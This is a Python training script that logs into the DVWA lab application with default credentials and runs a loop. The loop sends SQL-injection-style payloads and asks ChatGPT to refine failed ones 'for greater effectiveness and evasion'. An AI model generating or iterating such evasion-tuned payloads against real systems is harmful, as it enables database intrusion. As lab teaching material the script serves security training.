"""
Custom Payload Generation with ChatGPT
Testing and Refinement
['The process of testing custom payloads in controlled environments to ensure they work as intended.', 'Analyzes test results to offer suggestions for refining payloads for greater effectiveness and evasion.', 'Encourages the use of feedback loops to continuously improve payload design and deployment strategies.']
This script is for for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

# Prepend class name with PointlessAI_
class PointlessAI_testing_and_refinement(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def test_payload_effectiveness(self, session, payload, url):
        """
        Tests custom payloads in a controlled environment (DVWA).
        """
        response = session.post(url, data={"input": payload})
        return "Success" in response.text

    def refine_payload_with_chatgpt(self, initial_payload, test_results):
        """
        Analyzes test results and interacts with ChatGPT to refine payloads.
        """
        refined_payload_prompt = f"Refine this payload for greater effectiveness based on test results: {initial_payload}. Test results: {test_results}"
        refined_payload = self.red_team_query(refined_payload_prompt, self.no_markdown)
        return refined_payload

    def continuous_improvement_feedback_loop(self, session, url, payload):
        """
        Uses feedback loops to continuously improve payload design and effectiveness.
        """
        test_result = self.test_payload_effectiveness(session, payload, url)
        iteration_counter = 0
        while not test_result and iteration_counter < 5:
            iteration_counter += 1
            refinement_suggestions = self.refine_payload_with_chatgpt(payload, test_result)
            payload = refinement_suggestions
            test_result = self.test_payload_effectiveness(session, payload, url)
            print(f"Iteration {iteration_counter}, Payload refined to: {payload}")
        return payload

    def run_tests(self):
        """
        Demonstrates script functionality with DVWA.
        """
        with requests.Session() as s:
            user_token, cookies = self.get_csrf_token_and_cookie(s, self.login_url)
            _ = self.login_to_dvwa(s, self.login_url, "admin", "password", user_token)
            initial_payload = "SELECT * FROM users"
            url = self.sql_injection
            final_payload = self.continuous_improvement_feedback_loop(s, url, initial_payload)
            print(f"Final refined payload: {final_payload}")

def main():
    ai = PointlessAI_testing_and_refinement()  # Instantiate class
    ai.run_tests()

if __name__ == "__main__":
    main()
